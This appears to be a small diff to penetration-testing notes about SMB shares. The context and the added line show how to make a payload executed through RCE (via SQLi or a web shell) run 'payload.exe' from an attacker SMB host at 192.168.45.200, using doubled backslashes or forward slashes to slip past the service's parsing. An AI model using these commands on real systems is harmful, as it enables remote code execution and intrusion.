@@ -14,3 +14,4 @@ C:\>net use \\<IP>\<SMBShareName> ::This will connect to the SMB share.
 
 :: In some circustances (for example when we have RCE through some service SQLi, WebShell, etc) it could be necesary to add double backslash in order to bypass the service engine parse of the payload.
 :: And example could be: cmd.exe /c \\\\192.168.45.200\\smb\\payload.exe
+:: ANother thing we can try is to add forwardslash, //192.168.45.200/smb/payload.exe
